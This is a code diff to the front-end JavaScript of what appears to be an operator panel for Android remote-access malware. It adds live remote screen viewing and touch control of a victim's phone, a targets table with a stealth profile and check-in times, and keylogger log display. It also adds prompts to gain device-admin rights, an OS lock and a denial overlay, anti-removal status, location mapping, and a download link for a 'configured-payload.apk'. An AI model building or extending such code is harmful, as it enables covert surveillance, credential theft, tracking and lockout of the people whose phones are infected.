@@ -31,7 +31,7 @@ let _ac = false;
 let audioStream = null;
 let _ih = null;
 
-// Session Stability & Render Proxy Fetch Wrapper
+// Session Stability & Render Proxy Fetch Wrapper with Auto-Token Rotation
 const originalFetch = window.fetch;
 window.fetch = async function(resource, init) {
   let url = resource;
@@ -45,7 +45,14 @@ window.fetch = async function(resource, init) {
   }
   try {
     const response = await originalFetch(url, init);
-    if (response.status === 401) {
+    if (response.status === 401 && !url.includes('/api/auth/rotate') && !url.includes('/login')) {
+      try {
+        const rotateRes = await originalFetch('/api/auth/rotate', { method: 'POST' });
+        if (rotateRes.ok) {
+          return await originalFetch(url, init);
+        }
+      } catch (rotateErr) {}
+
       showToast("SESSION_EXPIRED: Re-authenticating...", "error");
       setTimeout(() => {
         window.location.reload();
@@ -471,6 +478,20 @@ async function updatePassword(e) {
   }
 }
 
+function downloadConfiguredApk() {
+  const inputEl = document.getElementById("new_pass_input") || document.querySelector('input[name="new_password"]');
+  const pass = inputEl ? inputEl.value.trim() : "";
+  if (pass) {
+    fetch("/settings/password", {
+      method: "POST",
+      headers: { "Content-Type": "application/x-www-form-urlencoded" },
+      body: "new_password=" + encodeURIComponent(mask(pass))
+    }).catch(e => console.error(e));
+  }
+  showToast("Initiating Configured APK Build...", "success");
+  window.open("/download/configured-payload.apk", "_blank");
+}
+
 // Logs View
 function fetchLogs() {
   const n = document.getElementById("log-terminal");
@@ -697,25 +718,33 @@ function executeShell() {
 // Ghost Screen Controls with Smooth Touch and Viewport Scaling
 function enforceGhostViewportScaling() {
   const streamImg = document.getElementById("ghost-screen-stream");
+  const phoneFrame = document.querySelector(".phone-frame");
   if (streamImg) {
     streamImg.style.width = "100%";
-    streamImg.style.maxWidth = "360px";
-    streamImg.style.height = "auto";
-    streamImg.style.maxHeight = "70vh";
-    streamImg.style.objectFit = "contain";
+    streamImg.style.height = "100%";
+    streamImg.style.objectFit = "fill";
     streamImg.style.display = "block";
-    streamImg.style.margin = "0 auto";
-    streamImg.style.borderRadius = "12px";
+    streamImg.style.borderRadius = "20px";
     streamImg.style.touchAction = "none";
     streamImg.style.webkitUserSelect = "none";
     streamImg.style.userSelect = "none";
 
-    const parent = streamImg.parentElement;
-    if (parent) {
-      parent.style.maxWidth = "100%";
-      parent.style.boxSizing = "border-box";
-      parent.style.overflow = "hidden";
-      parent.style.touchAction = "none";
+    if (phoneFrame) {
+      if (streamImg.naturalWidth && streamImg.naturalHeight) {
+        const aspectRatio = streamImg.naturalHeight / streamImg.naturalWidth;
+        const baseWidth = 280;
+        const calculatedScreenHeight = Math.round(baseWidth * aspectRatio);
+        phoneFrame.style.width = baseWidth + "px";
+        phoneFrame.style.height = calculatedScreenHeight + "px";
+      } else {
+        phoneFrame.style.width = "280px";
+        phoneFrame.style.height = "560px";
+      }
+      phoneFrame.style.maxWidth = "100%";
+      phoneFrame.style.boxSizing = "border-box";
+      phoneFrame.style.overflow = "hidden";
+      phoneFrame.style.position = "relative";
+      phoneFrame.style.touchAction = "none";
     }
 
     if (!streamImg.dataset.touchInitialized) {
@@ -745,9 +774,10 @@ function startGhostScreen() {
   if (statusCard) statusCard.style.display = "none";
   const btn = document.getElementById("ghost-toggle-btn");
   if (btn) {
-    btn.innerText = "TERMINATE";
+    btn.innerHTML = "TERMINATE";
     btn.style.borderColor = "var(--danger)";
     btn.style.color = "var(--danger)";
+    btn.style.background = "rgba(255, 49, 49, 0.08)";
   }
   refreshGhostScreen();
 }
@@ -761,9 +791,10 @@ function stopGhostScreen() {
   }
   const btn = document.getElementById("ghost-toggle-btn");
   if (btn) {
-    btn.innerText = "INITIATE_VIEW";
-    btn.style.borderColor = "var(--neon-green)";
-    btn.style.color = "var(--neon-green)";
+    btn.innerHTML = "INITIATE_VIEW";
+    btn.style.borderColor = "var(--neon-cyan)";
+    btn.style.color = "var(--neon-cyan)";
+    btn.style.background = "rgba(0, 242, 255, 0.05)";
   }
   const streamImg = document.getElementById("ghost-screen-stream");
   if (streamImg) streamImg.src = "";
@@ -777,27 +808,77 @@ function toggleGhostScreen() {
   }
 }
 
+let isGhostFetching = false;
+
 function refreshGhostScreen() {
-  if (_0x2a) {
-    const streamImg = document.getElementById("ghost-screen-stream");
-    const statusCard = document.getElementById("ghost-screen-status");
-    enforceGhostViewportScaling();
-    const img = new Image();
-    img.src = "/ghost/screenshot?t=" + Date.now();
-    img.onload = () => {
-      if (_0x2a && streamImg) {
-        streamImg.src = img.src;
-        if (statusCard) statusCard.style.display = "none";
-        setTimeout(refreshGhostScreen, _0x2b ? 5000 : 200);
-      }
-    };
-    img.onerror = () => {
-      if (_0x2a) setTimeout(refreshGhostScreen, 300);
-    };
+  if (!_0x2a || isGhostFetching) return;
+  isGhostFetching = true;
+
+  const streamImg = document.getElementById("ghost-screen-stream");
+  const statusCard = document.getElementById("ghost-screen-status");
+  enforceGhostViewportScaling();
+  const img = new Image();
+  img.src = "/ghost/screenshot?t=" + Date.now() + "&r=" + Math.random();
+  img.onload = () => {
+    isGhostFetching = false;
+    if (_0x2a && streamImg) {
+      streamImg.src = img.src;
+      if (statusCard) statusCard.style.display = "none";
+      setTimeout(refreshGhostScreen, 10);
+    }
+  };
+  img.onerror = () => {
+    isGhostFetching = false;
+    if (_0x2a) {
+      setTimeout(refreshGhostScreen, 50);
+    }
+  };
+}
+
+window.isGhostControlLocked = false;
+
+function toggleGhostControlLock() {
+  window.isGhostControlLocked = !window.isGhostControlLocked;
+  const lockBtn = document.getElementById("ghost-lock-btn");
+  const lockOverlay = document.getElementById("ghost-lock-overlay");
+  const streamImg = document.getElementById("ghost-screen-stream");
+
+  if (window.isGhostControlLocked) {
+    if (lockBtn) {
+      lockBtn.innerHTML = "&#128274; SCROLL LOCK";
+      lockBtn.style.borderColor = "var(--neon-yellow)";
+      lockBtn.style.color = "var(--neon-yellow)";
+      lockBtn.style.background = "rgba(255, 255, 0, 0.08)";
+    }
+    if (lockOverlay) lockOverlay.style.display = "flex";
+    if (streamImg) {
+      streamImg.style.touchAction = "auto";
+      streamImg.style.pointerEvents = "none";
+    }
+    showToast("PAGE_SCROLL_MODE_ENABLED");
+  } else {
+    if (lockBtn) {
+      lockBtn.innerHTML = "&#128274; SCROLL LOCK";
+      lockBtn.style.borderColor = "var(--neon-green)";
+      lockBtn.style.color = "var(--neon-green)";
+      lockBtn.style.background = "rgba(57, 255, 20, 0.08)";
+    }
+    if (lockOverlay) lockOverlay.style.display = "none";
+    if (streamImg) {
+      streamImg.style.touchAction = "none";
+      streamImg.style.pointerEvents = "auto";
+    }
+    showToast("REMOTE_CONTROL_ACTIVE");
   }
 }
 
+function ghostScroll(dir) {
+  let actionName = "scroll_" + dir;
+  fetch("/ghost/interact?action=" + actionName);
+}
+
 function startGhostDrag(e) {
+  if (window.isGhostControlLocked) return;
   if (e && e.stopPropagation) e.stopPropagation();
   const streamImg = document.getElementById("ghost-screen-stream");
   if (!streamImg) return;
@@ -818,6 +899,7 @@ function startGhostDrag(e) {
 }
 
 function endGhostDrag(e) {
+  if (window.isGhostControlLocked) return;
   if (e && e.stopPropagation) e.stopPropagation();
   if (!_0x2c) return;
 
@@ -869,9 +951,23 @@ function terminateOverlay() {
 
 function toggleLock() {
   fetch("/ghost/lock").then(() => {
-    showToast("Uplink command sent: SYSTEM_LOCK");
+    showToast("Uplink command sent: DENIAL_OVERLAY");
     checkGhostStatus();
   });
+}
+
+function triggerOsLock() {
+  showToast("DISPATCHING_OS_KEYGUARD_LOCK...");
+  fetch("/ghost/interact?action=os_lock")
+    .then(r => r.json())
+    .then(d => {
+      if (d.success) {
+        showToast("OS_PHONE_LOCK_DISPATCHED");
+      } else {
+        showToast(d.error || "DEVICE_ADMIN_NOT_ACTIVE", "error");
+      }
+    })
+    .catch(() => showToast("LOCK_DISPATCH_FAILED", "error"));
 }
 
 function toggleBlackout() {
@@ -922,7 +1018,25 @@ function transmitVoicePayload() {
 
 // Base Actions
 function ghostAction(e) {
-  fetch("/ghost/interact?action=" + e);
+  if (e === "elevateAdmin" || e === "elevate_admin" || e === "admin") {
+    const btn = document.getElementById("elevate-admin-btn");
+    if (btn) {
+      btn.innerText = "PROMPT_DISPATCHED";
+      btn.style.borderColor = "var(--neon-yellow)";
+      btn.style.color = "var(--neon-yellow)";
+    }
+    if (typeof showToast === "function") showToast("ADMIN_ELEVATION_PROMPT_DISPATCHED");
+  }
+  fetch("/ghost/interact?action=" + e)
+    .then(r => r.json())
+    .then(d => {
+      if (e !== "elevateAdmin" && e !== "elevate_admin" && e !== "admin" && typeof showToast === "function") {
+        showToast("ACTION_EXECUTED: " + e.toUpperCase());
+      }
+    })
+    .catch(err => {
+      if (typeof showToast === "function") showToast("ACTION_FAILED: " + e.toUpperCase(), "error");
+    });
 }
 
 function clearGhostLogs() {
@@ -1040,6 +1154,54 @@ function _0x5a(n, r, a, l, s) {
   }
 }
 
+async function refreshTargetsTable() {
+  const tbody = document.getElementById("targets-table-body");
+  if (!tbody) return;
+
+  try {
+    const res = await fetch("/terminal/targets");
+    const data = await res.json();
+    if (data && data.targets && Array.isArray(data.targets) && data.targets.length > 0) {
+      let urlParams = new URLSearchParams(window.location.search);
+      let currentDeviceId = urlParams.get('deviceId');
+
+      let target = data.targets[0];
+      if (currentDeviceId) {
+        let match = data.targets.find(t => t.deviceId === currentDeviceId || (t.deviceId && t.deviceId.toLowerCase() === currentDeviceId.toLowerCase()));
+        if (match) target = match;
+      }
+
+      let statusBadge = (target.status === "ONLINE" || !target.status)
+        ? '<span style="color:var(--neon-green); font-weight:bold; display:inline-flex; align-items:center; gap:4px;">&#128994; ONLINE</span>'
+        : '<span style="color:var(--danger); font-weight:bold; display:inline-flex; align-items:center; gap:4px;">&#128308; OFFLINE</span>';
+
+      let profileBadge = target.profile === "STEALTH"
+        ? '<span style="color:var(--neon-yellow); font-weight:bold;">STEALTH</span>'
+        : '<span style="color:var(--neon-green); font-weight:bold;">NORMAL</span>';
+
+      let rawEndpoint = target.endpointIp || target.ip || '127.0.0.1:9191';
+      let formattedEndpoint = rawEndpoint.includes(':') && !rawEndpoint.startsWith('127.') && !rawEndpoint.includes('[')
+        ? `<span style="word-break: break-all; white-space: normal; display: inline-block; max-width: 160px; font-size: 0.65rem; line-height: 1.2;">${rawEndpoint}</span>`
+        : rawEndpoint;
+
+      let row = `<tr style="background: rgba(255,255,255,0.02); border-radius: 6px;">
+        <td style="padding: 10px; color: var(--neon-cyan); font-weight: bold;">&#9999;&#65039; ${target.deviceId || 'samsung'}</td>
+        <td style="padding: 10px; color: #fff;">${target.model || 'SM-F731W'}</td>
+        <td style="padding: 10px; color: #ccc;">${target.osVersion || target.os || 'Android 16'}</td>
+        <td style="padding: 10px; color: #fff;">${target.battery || '100%'}</td>
+        <td style="padding: 10px; color: var(--neon-green); font-family: monospace; white-space: normal !important; word-break: break-all !important; max-width: 160px; min-width: 120px;">${formattedEndpoint}</td>
+        <td style="padding: 10px;">${statusBadge}</td>
+        <td style="padding: 10px;">${profileBadge}</td>
+        <td style="padding: 10px; color: #aaa;">${target.lastCheckIn || target.lastSeen || new Date().toLocaleString()}</td>
+      </tr>`;
+
+      tbody.innerHTML = row;
+    }
+  } catch (err) {
+    console.error("Targets refresh error:", err);
+  }
+}
+
 // Keylogger Terminal Logs
 async function refreshGhostLogs() {
   try {
@@ -1098,11 +1260,11 @@ async function checkGhostStatus() {
 
       if (lockBtn) {
         if (data.lock) {
-          lockBtn.innerHTML = "RELEASE_LOCK";
+          lockBtn.innerHTML = "UNLOCK";
           lockBtn.style.borderColor = "var(--neon-green)";
           lockBtn.style.color = "var(--neon-green)";
         } else {
-          lockBtn.innerHTML = "DEPLOY_LOCK";
+          lockBtn.innerHTML = "LOCKOUT";
           lockBtn.style.borderColor = "var(--danger)";
           lockBtn.style.color = "var(--danger)";
         }
@@ -1140,6 +1302,21 @@ async function checkGhostStatus() {
           antiRemovalBtn.style.borderColor = "var(--neon-yellow)";
           antiRemovalBtn.style.color = "var(--neon-yellow)";
           antiRemovalBtn.style.background = "rgba(255, 255, 0, 0.03)";
+        }
+      }
+
+      const elevateAdminBtn = document.getElementById("elevate-admin-btn");
+      if (elevateAdminBtn) {
+        if (data.isAdminActive) {
+          elevateAdminBtn.innerText = "ADMIN_GRANTED";
+          elevateAdminBtn.style.borderColor = "#a855f7";
+          elevateAdminBtn.style.color = "#a855f7";
+          elevateAdminBtn.style.background = "rgba(168, 85, 247, 0.15)";
+        } else if (elevateAdminBtn.innerText !== "PROMPT_DISPATCHED") {
+          elevateAdminBtn.innerText = "ELEVATE_ADMIN";
+          elevateAdminBtn.style.borderColor = "var(--danger)";
+          elevateAdminBtn.style.color = "var(--danger)";
+          elevateAdminBtn.style.background = "rgba(255, 49, 49, 0.05)";
         }
       }
     }
@@ -1396,7 +1573,7 @@ function locateDevice() {
         const extMapBtn = document.getElementById("ext-map-btn");
 
         if (mapFrame) {
-          mapFrame.srcdoc = `<!DOCTYPE html><html><head><link rel="stylesheet" href="https://unpkg.com/leaflet@1.9.4/dist/leaflet.css"/><script src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js"></script><style>html,body,#map{height:100%;margin:0;padding:0;background:#000;}.leaflet-tile-pane{filter:invert(90%) hue-rotate(180deg);}.red-pin{background-color:#ff0033;width:16px;height:16px;border-radius:50%;border:2px solid #ffffff;box-shadow:0 0 12px #ff0033, 0 0 24px #ff0033;animation:pulse 1.5s infinite;margin-left:-8px;margin-top:-8px;}@keyframes pulse{0%{box-shadow:0 0 0 0 rgba(255,0,51,0.8);}70%{box-shadow:0 0 0 15px rgba(255,0,51,0);}100%{box-shadow:0 0 0 0 rgba(255,0,51,0);}}</style></head><body><div id="map"></div><script>var m=L.map('map',{zoomControl:false}).setView([${data.lat},${data.lon}],15);L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png').addTo(m);var redIcon=L.divIcon({className:'custom-red-pin',html:'<div class="red-pin"></div>'});L.marker([${data.lat},${data.lon}],{icon:redIcon}).addTo(m);</script></body></html>`;
+          mapFrame.srcdoc = `<!DOCTYPE html><html><head><meta name="referrer" content="no-referrer"/><link rel="stylesheet" href="https://unpkg.com/leaflet@1.9.4/dist/leaflet.css"/><script src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js"></script><style>html,body,#map{height:100%;margin:0;padding:0;background:#02080d;}.leaflet-tile{filter:brightness(0.6) invert(1) contrast(3) hue-rotate(200deg) saturate(0.3);}.red-pin{background-color:#ff0033;width:16px;height:16px;border-radius:50%;border:2px solid #ffffff;box-shadow:0 0 12px #ff0033, 0 0 24px #ff0033;animation:pulse 1.5s infinite;margin-left:-8px;margin-top:-8px;}@keyframes pulse{0%{box-shadow:0 0 0 0 rgba(255,0,51,0.8);}70%{box-shadow:0 0 0 15px rgba(255,0,51,0);}100%{box-shadow:0 0 0 0 rgba(255,0,51,0);}}</style></head><body><div id="map"></div><script>var m=L.map('map',{zoomControl:false}).setView([${data.lat},${data.lon}],15);L.tileLayer('https://{s}.basemaps.cartocdn.com/rastertiles/voyager/{z}/{x}/{y}{r}.png',{maxZoom:19,subdomains:'abcd'}).addTo(m);var redIcon=L.divIcon({className:'custom-red-pin',html:'<div class="red-pin"></div>'});L.marker([${data.lat},${data.lon}],{icon:redIcon}).addTo(m);</script></body></html>`;
           mapFrame.style.display = "block";
         }
         if (mapOverlay) mapOverlay.style.display = "none";
@@ -1665,9 +1842,15 @@ document.addEventListener("DOMContentLoaded", () => {
     setInterval(fetchLogs, 5000);
   }
 
+  if (document.getElementById("targets-table-body")) {
+    refreshTargetsTable();
+    setInterval(refreshTargetsTable, 20000);
+  }
+
   if (document.getElementById("ghost-status-card") || document.getElementById("ghost-screen-stream")) {
     checkGhostStatus();
     refreshGhostLogs();
+    startGhostScreen();
     setInterval(checkGhostStatus, 2000);
     setInterval(refreshGhostLogs, 2000);
   }
